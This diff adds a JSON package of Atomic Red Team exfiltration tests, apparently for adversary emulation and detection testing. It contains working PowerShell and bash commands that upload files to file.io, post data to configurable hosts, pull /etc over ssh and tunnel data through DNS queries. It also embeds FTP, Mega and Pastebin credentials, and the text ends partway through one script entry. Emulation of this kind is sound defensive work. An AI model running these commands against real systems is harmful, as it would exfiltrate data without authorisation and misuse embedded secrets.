@@ -1,0 +1,1484 @@
+{
+  "package_id": "art-exfil-v1",
+  "package_name": "ART - Exfiltration Pack (Red Canary)",
+  "version": "1.0.0",
+  "description": "Red Canary Atomic Red Team scripts for MITRE ATT&CK Exfiltration (TA0010). 27 atomics covering 9 techniques: T1020, T1030, T1041, T1048, T1048.002, T1048.003, T1567.002, T1567.003, T1567.004. Converted from Red Canary atomic-red-team YAML. Tag keys prefixed with 'art_'.",
+  "author": "Red Canary (converted by X3M.AI)",
+  "created": "2026-08-11",
+  "source": "atomic-red-team",
+  "mitre_domain": "enterprise-attack",
+  "mitre_tactic": "Exfiltration (TA0010)",
+  "mitre_tactic_name": "Exfiltration",
+  "mitre_tcodes": [
+    "T1020",
+    "T1030",
+    "T1041",
+    "T1048",
+    "T1048.002",
+    "T1048.003",
+    "T1567.002",
+    "T1567.003",
+    "T1567.004"
+  ],
+  "platform": [
+    "linux",
+    "windows"
+  ],
+  "prerequisites": [
+    "Morgana agent installed on target machine",
+    "PyYAML not required at runtime — scripts are pre-converted"
+  ],
+  "tag_categories": [
+    {
+      "category_id": "art_exfil_1020",
+      "label": "1020 Parameters",
+      "description": "Input parameters for 1020 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1020"
+      ],
+      "tags": [
+        {
+          "key": "art_exfil_1020_file",
+          "label": "File",
+          "description": "Exfiltration File",
+          "default": "C:\\temp\\T1020_exfilFile.txt",
+          "example": "C:\\temp\\T1020_exfilFile.txt",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1020_domain",
+          "label": "Domain",
+          "description": "Destination Domain",
+          "default": "https://google.com",
+          "example": "https://google.com",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1020_samplefile",
+          "label": "Samplefile",
+          "description": "Path of the sample file to exfiltrate.",
+          "default": "C:\\temp\\T1020__FTP_sample.txt",
+          "example": "C:\\temp\\T1020__FTP_sample.txt",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1020_ftpserver",
+          "label": "Ftpserver",
+          "description": "FTP server URL.",
+          "default": "ftp://example.com",
+          "example": "ftp://example.com",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1020_credentials",
+          "label": "Credentials",
+          "description": "FTP server credentials.",
+          "default": "[user:password]",
+          "example": "[user:password]",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_exfil_1030",
+      "label": "1030 Parameters",
+      "description": "Input parameters for 1030 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1030"
+      ],
+      "tags": [
+        {
+          "key": "art_exfil_1030_file_name",
+          "label": "File Name",
+          "description": "File name",
+          "default": "T1030_urandom",
+          "example": "T1030_urandom",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1030_folder_path",
+          "label": "Folder Path",
+          "description": "Path where the test creates artifacts",
+          "default": "/tmp/T1030",
+          "example": "/tmp/T1030",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1030_source_file_path",
+          "label": "Source File Path",
+          "description": "Path to the source file to transfer.",
+          "default": "[User specified]",
+          "example": "[User specified]",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1030_destination_url",
+          "label": "Destination Url",
+          "description": "URL of the destination server.",
+          "default": "http://example.com",
+          "example": "http://example.com",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1030_chunk_size",
+          "label": "Chunk Size",
+          "description": "Size of each data chunk (in KB).",
+          "default": "1024",
+          "example": "1024",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_exfil_1041",
+      "label": "1041 Parameters",
+      "description": "Input parameters for 1041 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1041"
+      ],
+      "tags": [
+        {
+          "key": "art_exfil_1041_destination_url",
+          "label": "Destination Url",
+          "description": "Destination URL to post encoded data.",
+          "default": "example.com",
+          "example": "example.com",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1041_filepath",
+          "label": "Filepath",
+          "description": "The file which is being exfiltrated to the C2 Server.",
+          "default": "$env:TEMP\\LineNumbers.txt",
+          "example": "$env:TEMP\\LineNumbers.txt",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1041_dns_server",
+          "label": "Dns Server",
+          "description": "DNS server IP address or domain name.",
+          "default": "dns.example.com",
+          "example": "dns.example.com",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1041_exfiltrated_data",
+          "label": "Exfiltrated Data",
+          "description": "Data to be exfiltrated.",
+          "default": "SecretDataToExfiltrate",
+          "example": "SecretDataToExfiltrate",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1041_chunk_size",
+          "label": "Chunk Size",
+          "description": "Size of each DNS query chunk (in characters).",
+          "default": "63",
+          "example": "63",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_exfil_1048",
+      "label": "1048 Parameters",
+      "description": "Input parameters for 1048 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1048"
+      ],
+      "tags": [
+        {
+          "key": "art_exfil_1048_domain",
+          "label": "Domain",
+          "description": "target SSH domain",
+          "default": "target.example.com",
+          "example": "target.example.com",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_user_name",
+          "label": "User Name",
+          "description": "username for domain",
+          "default": "atomic",
+          "example": "atomic",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_password",
+          "label": "Password",
+          "description": "password for user",
+          "default": "atomic",
+          "example": "atomic",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_ps_module",
+          "label": "Ps Module",
+          "description": "DNSExfiltrator powershell ps_module",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1",
+          "example": "PathToAtomicsFolder\\..\\ExternalPayloads\\dnsexfil.ps1",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_doh",
+          "label": "Doh",
+          "description": "Google or CloudFlare DoH (DNS over HTTP) server",
+          "default": "google",
+          "example": "google",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_time",
+          "label": "Time",
+          "description": "The time in milliseconds to wait between each DNS request",
+          "default": "500",
+          "example": "500",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_encoding",
+          "label": "Encoding",
+          "description": "Set to '-b32' to use base32 encoding of data. Might be required by some DNS resolvers.",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_dns_port",
+          "label": "Dns Port",
+          "description": "Attacker's DNS server port",
+          "default": "53",
+          "example": "53",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_attacker_dns_server",
+          "label": "Attacker Dns Server",
+          "description": "Attacker's DNS server address",
+          "default": "8.8.8.8",
+          "example": "8.8.8.8",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_secret_info",
+          "label": "Secret Info",
+          "description": "secret info that will be exfiltirated",
+          "default": "this is a secret info",
+          "example": "this is a secret info",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_exfil_1048_002",
+      "label": "1048.002 Parameters",
+      "description": "Input parameters for 1048.002 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1048.002"
+      ],
+      "tags": [
+        {
+          "key": "art_exfil_1048_002_input_file",
+          "label": "Input File",
+          "description": "Test file to upload",
+          "default": "PathToAtomicsFolder/T1048.002/src/artifact",
+          "example": "PathToAtomicsFolder/T1048.002/src/artifact",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_002_curl_path",
+          "label": "Curl Path",
+          "description": "path to curl.exe",
+          "default": "C:\\Windows\\System32\\Curl.exe",
+          "example": "C:\\Windows\\System32\\Curl.exe",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_002_endpoint_domain",
+          "label": "Endpoint Domain",
+          "description": "Endpoint to send data to",
+          "default": "https://example.com/",
+          "example": "https://example.com/",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_exfil_1048_003",
+      "label": "1048.003 Parameters",
+      "description": "Input parameters for 1048.003 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1048.003"
+      ],
+      "tags": [
+        {
+          "key": "art_exfil_1048_003_input_file",
+          "label": "Input File",
+          "description": "Path to file to be exfiltrated.",
+          "default": "C:\\Windows\\System32\\notepad.exe",
+          "example": "C:\\Windows\\System32\\notepad.exe",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_003_ip_address",
+          "label": "Ip Address",
+          "description": "Destination IP address where the data should be sent.",
+          "default": "127.0.0.1",
+          "example": "127.0.0.1",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_003_sender",
+          "label": "Sender",
+          "description": "The email address of the sender",
+          "default": "test@corp.com",
+          "example": "test@corp.com",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_003_receiver",
+          "label": "Receiver",
+          "description": "The email address of the receiver",
+          "default": "test@corp.com",
+          "example": "test@corp.com",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_003_smtp_server",
+          "label": "Smtp Server",
+          "description": "SMTP server to use for email transportation",
+          "default": "127.0.0.1",
+          "example": "127.0.0.1",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_003_ftp_server",
+          "label": "Ftp Server",
+          "description": "FTP Server address",
+          "default": "127.0.0.1",
+          "example": "127.0.0.1",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_003_username",
+          "label": "Username",
+          "description": "Username for FTP server login",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_003_password",
+          "label": "Password",
+          "description": "Password for FTP server login",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_003_ftp_pass",
+          "label": "Ftp Pass",
+          "description": "Your FTP user's password",
+          "default": "rNrKYTX9g7z3RgJRmxWuGHbeu",
+          "example": "rNrKYTX9g7z3RgJRmxWuGHbeu",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_003_ftp_user",
+          "label": "Ftp User",
+          "description": "Your FTP username",
+          "default": "dlpuser",
+          "example": "dlpuser",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1048_003_ftp_port",
+          "label": "Ftp Port",
+          "description": "Your FTP's port",
+          "default": "21",
+          "example": "21",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_exfil_1567_002",
+      "label": "1567.002 Parameters",
+      "description": "Input parameters for 1567.002 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1567.002"
+      ],
+      "tags": [
+        {
+          "key": "art_exfil_1567_002_rclone_path",
+          "label": "Rclone Path",
+          "description": "Directory of rclone.exe",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\",
+          "example": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002\\rclone-v*\\",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_rclone_config_path",
+          "label": "Rclone Config Path",
+          "description": "Path to rclone's config file (default should be fine)",
+          "default": "$env:appdata",
+          "example": "$env:appdata",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_dir_to_copy",
+          "label": "Dir To Copy",
+          "description": "Directory to copy",
+          "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002",
+          "example": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1567.002",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_mega_user_account",
+          "label": "Mega User Account",
+          "description": "Mega user account",
+          "default": "atomictesting@outlook.com",
+          "example": "atomictesting@outlook.com",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_mega_user_password",
+          "label": "Mega User Password",
+          "description": "Mega user password",
+          "default": "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA",
+          "example": "vmcjt1A_LEMKEXXy0CKFoiFCEztpFLcZVNinHA",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_remote_share",
+          "label": "Remote Share",
+          "description": "Remote Mega share",
+          "default": "T1567002",
+          "example": "T1567002",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_exfil_directory",
+          "label": "Exfil Directory",
+          "description": "Directory to exfiltrate",
+          "default": "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/",
+          "example": "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_terraform_path",
+          "label": "Terraform Path",
+          "description": "Directory of terraform",
+          "default": "PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*",
+          "example": "PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_aws_access_key",
+          "label": "Aws Access Key",
+          "description": "AWS Access Key",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_aws_secret_key",
+          "label": "Aws Secret Key",
+          "description": "AWS Secret Key",
+          "default": "",
+          "example": "",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_aws_region",
+          "label": "Aws Region",
+          "description": "AWS Region",
+          "default": "us-east-1",
+          "example": "us-east-1",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_002_aws_profile",
+          "label": "Aws Profile",
+          "description": "AWS Profile",
+          "default": "default",
+          "example": "default",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_exfil_1567_003",
+      "label": "1567.003 Parameters",
+      "description": "Input parameters for 1567.003 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1567.003"
+      ],
+      "tags": [
+        {
+          "key": "art_exfil_1567_003_api_key",
+          "label": "Api Key",
+          "description": "Pastebin API key",
+          "default": "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0",
+          "example": "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    },
+    {
+      "category_id": "art_exfil_1567_004",
+      "label": "1567.004 Parameters",
+      "description": "Input parameters for 1567.004 atomic tests.",
+      "scope": "local",
+      "used_by_tcodes": [
+        "1567.004"
+      ],
+      "tags": [
+        {
+          "key": "art_exfil_1567_004_webhook_url",
+          "label": "Webhook Url",
+          "description": "Discord incoming webhook URL the staged data is exfiltrated to",
+          "default": "https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken",
+          "example": "https://discord.com/api/webhooks/000000000000000000/ReplaceWithYourWebhookToken",
+          "sensitive": false,
+          "required": false
+        },
+        {
+          "key": "art_exfil_1567_004_staged_file",
+          "label": "Staged File",
+          "description": "Path to the file that is staged and exfiltrated",
+          "default": "$env:TEMP\\T1567.004_loot.txt",
+          "example": "$env:TEMP\\T1567.004_loot.txt",
+          "sensitive": false,
+          "required": false
+        }
+      ]
+    }
+  ],
+  "scripts": [
+    {
+      "id": "ART - T1020 - IcedID Botnet HTTP PUT",
+      "name": "ART - T1020 - IcedID Botnet HTTP PUT",
+      "description": "Creates a text file\nTries to upload to a server via HTTP PUT method with ContentType Header\nDeletes a created file",
+      "tactic": "Exfiltration",
+      "tcode": "T1020",
+      "technique_name": "IcedID Botnet HTTP PUT",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1020_file",
+        "art_exfil_1020_domain"
+      ],
+      "command": "$fileName = \"#{art_exfil_1020_file}\"\n$url = \"#{art_exfil_1020_domain}\"\n$file = New-Item -Force $fileName -Value \"This is ART IcedID Botnet Exfil Test\"\n$contentType = \"application/octet-stream\"\ntry {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}",
+      "cleanup_command": "$fileName = \"#{art_exfil_1020_file}\"\nRemove-Item -Path $fileName -ErrorAction Ignore",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0"
+    },
+    {
+      "id": "ART - T1020 - Exfiltration via Encrypted FTP",
+      "name": "ART - T1020 - Exfiltration via Encrypted FTP",
+      "description": "Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.",
+      "tactic": "Exfiltration",
+      "tcode": "T1020",
+      "technique_name": "Exfiltration via Encrypted FTP",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1020_samplefile",
+        "art_exfil_1020_ftpserver",
+        "art_exfil_1020_credentials"
+      ],
+      "command": "$sampleData = \"Sample data for exfiltration test\"\nSet-Content -Path \"#{art_exfil_1020_samplefile}\" -Value $sampleData\n$ftpUrl = \"#{art_exfil_1020_ftpserver}\"\n$creds = Get-Credential -Credential \"#{art_exfil_1020_credentials}\"\nInvoke-WebRequest -Uri $ftpUrl -Method Put -InFile \"#{art_exfil_1020_samplefile}\" -Credential $creds",
+      "cleanup_command": "Remove-Item -Path \"#{art_exfil_1020_samplefile}\" -ErrorAction Ignore",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "5b380e96-b0ef-4072-8a8e-f194cb9eb9ac"
+    },
+    {
+      "id": "ART - T1030 - Data Transfer Size Limits",
+      "name": "ART - T1030 - Data Transfer Size Limits",
+      "description": "Take a file/directory, split it into 5Mb chunks\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1030",
+      "technique_name": "Data Transfer Size Limits",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "art_exfil_1030_file_name",
+        "art_exfil_1030_folder_path"
+      ],
+      "command": "cd #{art_exfil_1030_folder_path}; split -b 5000000 #{art_exfil_1030_file_name}\nls -l #{art_exfil_1030_folder_path}",
+      "cleanup_command": "if [ -f #{art_exfil_1030_folder_path}/safe_to_delete ]; then rm -rf #{art_exfil_1030_folder_path}; fi;",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "ab936c51-10f4-46ce-9144-e02137b2016a"
+    },
+    {
+      "id": "ART - T1030 - Network-Based Data Transfer in Small Chunks",
+      "name": "ART - T1030 - Network-Based Data Transfer in Small Chunks",
+      "description": "Simulate transferring data over a network in small chunks to evade detection.",
+      "tactic": "Exfiltration",
+      "tcode": "T1030",
+      "technique_name": "Network-Based Data Transfer in Small Chunks",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1030_source_file_path",
+        "art_exfil_1030_destination_url",
+        "art_exfil_1030_chunk_size"
+      ],
+      "command": "$file = [System.IO.File]::OpenRead(#{art_exfil_1030_source_file_path})\n$chunkSize = #{art_exfil_1030_chunk_size} * 1KB\n$buffer = New-Object Byte[] $chunkSize\n\nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n    Invoke-WebRequest -Uri #{art_exfil_1030_destination_url} -Method Post -Body $encodedChunk\n}\n$file.Close()",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "f0287b58-f4bc-40f6-87eb-692e126e7f8f"
+    },
+    {
+      "id": "ART - T1041 - C2 Data Exfiltration",
+      "name": "ART - T1041 - C2 Data Exfiltration",
+      "description": "Exfiltrates a file present on the victim machine to the C2 server.\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1041",
+      "technique_name": "C2 Data Exfiltration",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1041_destination_url",
+        "art_exfil_1041_filepath"
+      ],
+      "command": "if(-not (Test-Path #{art_exfil_1041_filepath})){ \n  1..100 | ForEach-Object { Add-Content -Path #{art_exfil_1041_filepath} -Value \"This is line $_.\" }\n}\n[System.Net.ServicePointManager]::Expect100Continue = $false\n$filecontent = Get-Content -Path #{art_exfil_1041_filepath}\nInvoke-WebRequest -Uri #{art_exfil_1041_destination_url} -Method POST -Body $filecontent -DisableKeepAlive",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "d1253f6e-c29b-49dc-b466-2147a6191932"
+    },
+    {
+      "id": "ART - T1041 - Text Based Data Exfiltration using DNS subdomains",
+      "name": "ART - T1041 - Text Based Data Exfiltration using DNS subdomains",
+      "description": "Simulates an adversary using DNS tunneling to exfiltrate data over a Command and Control (C2) channel.\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1041",
+      "technique_name": "Text Based Data Exfiltration using DNS subdomains",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1041_dns_server",
+        "art_exfil_1041_exfiltrated_data",
+        "art_exfil_1041_chunk_size"
+      ],
+      "command": "$dnsServer = \"#{art_exfil_1041_dns_server}\"\n$exfiltratedData = \"#{art_exfil_1041_exfiltrated_data}\"\n$chunkSize = #{art_exfil_1041_chunk_size}\n\n$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData)\n$encodedData = [Convert]::ToBase64String($encodedData)\n$chunks = $encodedData -split \"(.{$chunkSize})\"\n\nforeach ($chunk in $chunks) {\n    $dnsQuery = $chunk + \".\" + $dnsServer\n    Resolve-DnsName -Name $dnsQuery\n    Start-Sleep -Seconds 5\n}",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "c9207f3e-213d-4cc7-ad2a-7697a7237df9"
+    },
+    {
+      "id": "ART - T1048 - Exfiltration Over Alternative Protocol - SSH",
+      "name": "ART - T1048 - Exfiltration Over Alternative Protocol - SSH",
+      "description": "Input a domain and test Exfiltration over SSH\n\nRemote to Local\n\nUpon successful execution, sh will spawn ssh contacting a remote domain (default: target.example.com) writing a tar.gz file.\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048",
+      "technique_name": "Exfiltration Over Alternative Protocol - SSH",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "art_exfil_1048_domain"
+      ],
+      "command": "ssh #{art_exfil_1048_domain} \"(cd /etc && tar -zcvf - *)\" > ./etc.tar.gz",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "f6786cc8-beda-4915-a4d6-ac2f193bb988"
+    },
+    {
+      "id": "ART - T1048 - Exfiltration Over Alternative Protocol - SSH [7c3cb337]",
+      "name": "ART - T1048 - Exfiltration Over Alternative Protocol - SSH [7c3cb337]",
+      "description": "Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048",
+      "technique_name": "Exfiltration Over Alternative Protocol - SSH",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "art_exfil_1048_user_name",
+        "art_exfil_1048_password",
+        "art_exfil_1048_domain"
+      ],
+      "command": "tar czpf - /Users/* | openssl des3 -salt -pass #{art_exfil_1048_password} | ssh #{art_exfil_1048_user_name}@#{art_exfil_1048_domain} 'cat > /Users.tar.gz.enc'",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "7c3cb337-35ae-4d06-bf03-3032ed2ec268"
+    },
+    {
+      "id": "ART - T1048 - DNSExfiltration (doh)",
+      "name": "ART - T1048 - DNSExfiltration (doh)",
+      "description": "DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github pag...",
+      "tactic": "Exfiltration",
+      "tcode": "T1048",
+      "technique_name": "DNSExfiltration (doh)",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1048_password",
+        "art_exfil_1048_domain",
+        "art_exfil_1048_ps_module",
+        "art_exfil_1048_doh",
+        "art_exfil_1048_time",
+        "art_exfil_1048_encoding"
+      ],
+      "command": "Import-Module \"#{art_exfil_1048_ps_module}\"\nInvoke-DNSExfiltrator -i \"#{art_exfil_1048_ps_module}\" -d #{art_exfil_1048_domain} -p #{art_exfil_1048_password} -doh #{art_exfil_1048_doh} -t #{art_exfil_1048_time} #{art_exfil_1048_encoding}",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "c943d285-ada3-45ca-b3aa-7cd6500c6a48"
+    },
+    {
+      "id": "ART - T1048 - Exfiltrate Data using DNS Queries via dig",
+      "name": "ART - T1048 - Exfiltrate Data using DNS Queries via dig",
+      "description": "This test demonstrates how an attacker can exfiltrate sensitive information by encoding it as a subdomain (using base64 encoding) and \nmaking DNS queries via the dig command to a controlled DNS server.\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048",
+      "technique_name": "Exfiltrate Data using DNS Queries via dig",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "art_exfil_1048_dns_port",
+        "art_exfil_1048_attacker_dns_server",
+        "art_exfil_1048_secret_info"
+      ],
+      "command": "dig @#{art_exfil_1048_attacker_dns_server} -p #{art_exfil_1048_dns_port} $(echo \"#{art_exfil_1048_secret_info}\" | base64).google.com",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "a27916da-05f2-4316-a3ee-feec67a437be"
+    },
+    {
+      "id": "ART - T1048.002 - Exfiltrate data HTTPS using curl windows",
+      "name": "ART - T1048.002 - Exfiltrate data HTTPS using curl windows",
+      "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048.002",
+      "technique_name": "Exfiltrate data HTTPS using curl windows",
+      "executor": "cmd",
+      "platform": "windows",
+      "required_tags": [
+        "art_exfil_1048_002_input_file",
+        "art_exfil_1048_002_curl_path"
+      ],
+      "command": "#{art_exfil_1048_002_curl_path} -k -F \"file=@#{art_exfil_1048_002_input_file}\" https://file.io/",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0"
+    },
+    {
+      "id": "ART - T1048.002 - Exfiltrate data HTTPS using curl freebsd,linux or macos",
+      "name": "ART - T1048.002 - Exfiltrate data HTTPS using curl freebsd,linux or macos",
+      "description": "Exfiltrate data HTTPS using curl to file share site file.io\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048.002",
+      "technique_name": "Exfiltrate data HTTPS using curl freebsd,linux or macos",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "art_exfil_1048_002_input_file"
+      ],
+      "command": "curl -F 'file=@#{art_exfil_1048_002_input_file}' -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "source": "atomic-red-team",
+      "atomic_guid": "4a4f31e2-46ea-4c26-ad89-f09ad1d5fe01"
+    },
+    {
+      "id": "ART - T1048.002 - Exfiltrate data in a file over HTTPS using wget",
+      "name": "ART - T1048.002 - Exfiltrate data in a file over HTTPS using wget",
+      "description": "Exfiltrate data over HTTPS using wget --post-file method\n",
+      "tactic": "Exfiltration",
+      "tcode": "T1048.002",
+      "technique_name": "Exfiltrate data in a file over HTTPS using wget",
+      "executor": "bash",
+      "platform": "linux",
+      "required_tags": [
+        "art_exfil_1048_002_input_file",
+        "art_exfil_1048_002_endpoint_domain"
+      ],
+      "command": "wget --post-file=\"#{art_exfil_1048_002_input_file}\" --timeout=5 --no-check-certificate #{art_exfil_1048_002_endpoint_domain} --delete-after",
+      "cleanup_command": "",
+      "detection_rule": "See MITRE ATT&CK page for detection guidance",
